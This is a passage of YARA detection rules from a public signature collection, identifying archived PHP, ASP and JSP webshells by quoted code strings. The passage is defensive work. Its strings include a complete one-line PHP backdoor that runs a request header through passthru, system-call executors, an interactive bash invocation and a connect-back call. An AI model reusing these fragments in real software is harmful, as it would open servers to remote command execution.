		$s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
		$s19 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword

	condition:
		4 of them
}

rule SIGNATURE_BASE_Webshell_NCC_Shell_1
{
	meta:
		description = "PHP Webshells Github Archive - file NCC-Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3a2dab3d-faf0-52a5-b114-db402885c618"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6222-L6238"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "64d4495875a809b2730bd93bec2e33902ea80a53"
		logic_hash = "c58edc548b7804be25f6956e9407cc9f8c74dfd8651f601a87ba639284e612d9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = " if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {" fullword
		$s1 = "<b>--Coded by Silver" fullword
		$s2 = "<title>Upload - Shell/Datei</title>" fullword
		$s8 = "<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b><"
		$s14 = "~|_Team .:National Cracker Crew:._|~<br>" fullword
		$s18 = "printf(\"Sie ist %u Bytes gro" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_README_1
{
	meta:
		description = "PHP Webshells Github Archive - file README.md"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6239-L6251"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ef2c567b4782c994db48de0168deb29c812f7204"
		logic_hash = "aa8a9be74bbac08518d5ba442aa6fa37d3f1b255df48b49ccb9842f5728a49d5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
		$s1 = "php-webshells" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Backupsql_1
{
	meta:
		description = "PHP Webshells Github Archive - file backupsql.php"
		author = "Florian Roth (Nextron Systems)"
		id = "15d6e967-1e53-53b4-a2cf-7786452495d4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6252-L6267"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "863e017545ec8e16a0df5f420f2d708631020dd4"
		logic_hash = "0126bfad6eb3861e8322ac3e11b4fd95bc8b88597d916e66c6646d7d5529c1d5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" ."
		$s1 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
		$s2 = "* as email attachment, or send to a remote ftp server by" fullword
		$s16 = "* Neagu Mihai<neagumihai@hotmail.com>" fullword
		$s17 = "$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may "

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_AK_74_Security_Team_Web_Shell_Beta_Version_1
{
	meta:
		description = "PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php"
		author = "Florian Roth (Nextron Systems)"
		id = "e93a6ac3-080f-53d3-8368-b9feb509a2ea"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6268-L6281"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c90b0ba575f432ecc08f8f292f3013b5532fe2c4"
		logic_hash = "4fbf8f5cab8593fd88e5a430b849e61d7d663c13700f459aa516c5b337d5438b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
		$s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'."
		$s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Cpanel_1
{
	meta:
		description = "PHP Webshells Github Archive - file cpanel.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6282-L6298"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "433dab17106b175c7cf73f4f094e835d453c0874"
		logic_hash = "e4dc90c52648f1e5b7dc2d77dcb94feb774ec9e3c156c923c54a9e8f537bbf07"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "function ftp_check($host,$user,$pass,$timeout){" fullword
		$s3 = "curl_setopt($ch, CURLOPT_URL, \"http://$host:2082\");" fullword
		$s4 = "[ user@alturks.com ]# info<b><br><font face=tahoma><br>" fullword
		$s12 = "curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);" fullword
		$s13 = "Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir"
		$s20 = "<br><b>Please enter your USERNAME and PASSWORD to logon<br>" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Accept_Language_1
{
	meta:
		description = "PHP Webshells Github Archive - file accept_language.php"
		author = "Florian Roth (Nextron Systems)"
		id = "343ed2a4-4bed-5e73-8d05-f9573b0147af"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6299-L6310"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "180b13576f8a5407ab3325671b63750adbcb62c9"
		logic_hash = "6d45071722268f5b39b1486a7dce883ecefb2b3c9993357b7b58bd603ff1c40d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_529_1
{
	meta:
		description = "PHP Webshells Github Archive - file 529.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6311-L6328"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ba3fb2995528307487dff7d5b624d9f4c94c75d3"
		logic_hash = "f46b84d51077f157c83cd01534dfe7f9cd0d9ef04ad9935ced22d2abc873c171"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> " fullword
		$s7 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin"
		$s9 = "echo '<PRE><P>This is exploit from <a " fullword
		$s10 = "This Exploit Was Edited By KingDefacer" fullword
		$s13 = "safe_mode and open_basedir Bypass PHP 5.2.9 " fullword
		$s14 = "$hardstyle = explode(\"/\", $file); " fullword
		$s20 = "while($level--) chdir(\"..\"); " fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_STNC_Webshell_V0_8_1
{
	meta:
		description = "PHP Webshells Github Archive - file STNC WebShell v0.8.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5dc300a2-9965-52e3-a382-b8d327eb7029"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6329-L6342"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "52068c9dff65f1caae8f4c60d0225708612bb8bc"
		logic_hash = "c2067a1b78c441aa05366b612090e0df895c621843038cc9e65beb6719c0cb9a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];" fullword
		$s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()"
		$s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Tryag_1
{
	meta:
		description = "PHP Webshells Github Archive - file tryag.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6343-L6358"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "42d837e9ab764e95ed11b8bd6c29699d13fe4c41"
		logic_hash = "2af3bbe8d1940e60843f3f5d40c9c6550e76df21568c374f7a871f73aeefae44"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>" fullword
		$s3 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; " fullword
		$s6 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0; " fullword
		$s7 = "$tabledump .= \"CREATE TABLE $table (\\n\"; " fullword
		$s14 = "echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Dc3_Security_Crew_Shell_Priv_2_1
{
	meta:
		description = "PHP Webshells Github Archive - file dC3 Security Crew Shell PRiV.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1d4a95c4-8128-504d-958f-dcc5c68f4975"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6359-L6374"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9077eb05f4ce19c31c93c2421430dd3068a37f17"
		logic_hash = "52dc0449c205ff9105e2dedc3cb4858f83a2efc7bae579656a26da493dc59500"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
		$s9 = "header(\"Last-Modified: \".date(\"r\",filemtime(__FILE__)));" fullword
		$s13 = "header(\"Content-type: image/gif\");" fullword
		$s14 = "@copy($file,$to) or die (\"[-]Error copying file!\");" fullword
		$s20 = "if (isset($_GET['rename_all'])) {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Qsd_Php_Backdoor_1
{
	meta:
		description = "PHP Webshells Github Archive - file qsd-php-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f8208851-159c-5d0b-91ad-478aeb4fc9fd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6375-L6389"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4856bce45fc5b3f938d8125f7cdd35a8bbae380f"
		logic_hash = "3ef7b67cd60370a99fdfa6fd614f71ee314af27c9d983383dde8f03a127a28b3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c"
		$s2 = "if(isset($_POST[\"newcontent\"]))" fullword
		$s3 = "foreach($parts as $val)//Assemble the path back together" fullword
		$s7 = "$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Spygrup_1
{
	meta:
		description = "PHP Webshells Github Archive - file spygrup.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6390-L6404"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "12f9105332f5dc5d6360a26706cd79afa07fe004"
		logic_hash = "5981f8cc1a98f799b1573cf73297383f995acf1c40f0227ac10302dc4d6fd6cc"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "kingdefacer@msn.com</FONT></CENTER></B>\");" fullword
		$s6 = "if($_POST['root']) $root = $_POST['root'];" fullword
		$s12 = "\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>" fullword
		$s18 = "By KingDefacer From Spygrup.org>" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Web_Shell__C_Shankar_1
{
	meta:
		description = "PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php"
		author = "Florian Roth (Nextron Systems)"
		id = "966f5580-21c5-5ecf-b500-bde3d1ba4494"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6405-L6419"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3dd4f25bd132beb59d2ae0c813373c9ea20e1b7a"
		logic_hash = "9d320eed18a5d76a87cee4ea0fa9caf08f096f7eeaab55420540aa082b596e0f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "header(\"Content-Length: \".filesize($_POST['downf']));" fullword
		$s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump"
		$s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\"" fullword
		$s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Gamma_Web_Shell_1
{
	meta:
		description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "43b4fc9f-8897-5553-8846-29d307efa885"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6435-L6449"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7ef773df7a2f221468cc8f7683e1ace6b1e8139a"
		logic_hash = "1de868c4948a95272d288aeba3ac38b84bf6b33ede6b3b600b32530c85586404"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
		$s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
		$s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
		$s20 = "my $command = $self->query('command');" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Aspydrv_1
{
	meta:
		description = "PHP Webshells Github Archive - file aspydrv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6450-L6465"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3d8996b625025dc549d73cdb3e5fa678ab35d32a"
		logic_hash = "314fd671b163b9904cc78cb3a5858f5b1e3dfae9d520d5ebc545a7abd922e9f7"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files"
		$s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
		$s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
		$s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
		$s20 = "' ---Copy Too Folder routine Start" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Jspwebshell_1_2_2_1
{
	meta:
		description = "PHP Webshells Github Archive - file JspWebshell 1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "659f5c7d-0a9c-554d-a0ad-e3bcb8c5a1e9"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6466-L6481"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "184fc72b51d1429c44a4c8de43081e00967cf86b"
		logic_hash = "41d937fce969a850a2e4e07eb168becc96a036317a78d620e812707be9466dfc"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s4 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword
		$s15 = "endPoint=random1.getFilePointer();" fullword
		$s20 = "if (request.getParameter(\"command\") != null) {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_G00Nshell_V1_3_1
{
	meta:
		description = "PHP Webshells Github Archive - file g00nshell-v1.3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "61a09576-7e62-5a30-a52c-492b81b96322"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6482-L6497"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "70fe072e120249c9e2f0a8e9019f984aea84a504"
		logic_hash = "2ecb3ce2aa43a99552fb26e610c35bdb04f4ff0dc75c867e4327d6e27eed0177"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
		$s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
		$s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
		$s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
		$s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Winx_Shell_2_1
{
	meta:
		description = "PHP Webshells Github Archive - file WinX Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ebad4f2e-96c3-5cb7-b228-de3a6a39ae55"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_WinX_Shell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6498-L6514"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a94d65c168344ad9fa406d219bdf60150c02010e"
		logic_hash = "f953c297763e41d197ce186dc818b656951dfa8c855c5063fc4abb54eeefc7bb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "// It's simple shell for all Win OS." fullword
		$s5 = "//------- [netstat -an] and [ipconfig] and [tasklist] ------------" fullword
		$s6 = "<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>" fullword
		$s13 = "// Created by greenwood from n57" fullword
		$s20 = " if (is_uploaded_file($userfile)) {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_PHANTASMA_1
{
	meta:
		description = "PHP Webshells Github Archive - file PHANTASMA.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b36a7dbb-7d40-5fca-8409-c8822298005c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6515-L6529"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cd12d42abf854cd34ff9e93a80d464620af6d75e"
		logic_hash = "355be62807182f9a53bac20a6dead8f0a3bee83b6bdc4566502c157f16076b9b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s12 = "\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" ." fullword
		$s15 = "if ($portscan != \"\") {" fullword
		$s16 = "echo \"<br>Banner: $get <br><br>\";" fullword
		$s20 = "$dono = get_current_user( );" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Cw_1
{
	meta:
		description = "PHP Webshells Github Archive - file cw.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6530-L6546"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e65e0670ef6edf0a3581be6fe5ddeeffd22014bf"
		logic_hash = "52bfb14f4d5d3df787ce7782cbbee25ea1556758eed48e3001c8a3f35a541526"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "// Dump Database [pacucci.com]" fullword
		$s2 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword
		$s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword
		$s8 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt"
		$s14 = "$dump .= \"-- Cyber-Warrior.Org\\n\";" fullword
		$s20 = "if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Include_W_Shell_1
{
	meta:
		description = "PHP Webshells Github Archive - file php-include-w-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a80ca446-6612-51b4-99a7-8a8d8e6ee196"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6547-L6560"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1a7f4868691410830ad954360950e37c582b0292"
		logic_hash = "2be144060d4fdaee38214dc2eba80c2a6fd3699060d274e66356fd5a08c9be4b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
		$s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
		$s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Mysql_Tool_1
{
	meta:
		description = "PHP Webshells Github Archive - file mysql_tool.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a22a0a5c-a686-517e-b1f9-279edab0616b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6561-L6573"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c9cf8cafcd4e65d1b57fdee5eef98f0f2de74474"
		logic_hash = "611636b3fa9a3163574b18cf8eacebea9733a1ad381261387f79a532b003e8fd"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
		$s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Phpspy_Ver_2006_1
{
	meta:
		description = "PHP Webshells Github Archive - file PhpSpy Ver 2006.php"
		author = "Florian Roth (Nextron Systems)"
		id = "adbb1963-31c8-5540-a679-c75b1101c163"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6574-L6588"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "34a89e0ab896c3518d9a474b71ee636ca595625d"
		logic_hash = "69bd2c387b0e676168116f3b3c3c081e08fd555cc6bc9a94b9c8ef97f194b09f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
		$s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
		$s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32"
		$s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Zyklonshell_1
{
	meta:
		description = "PHP Webshells Github Archive - file ZyklonShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4d7ff3e5-4940-52c8-b045-5db1523f70c2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6589-L6603"
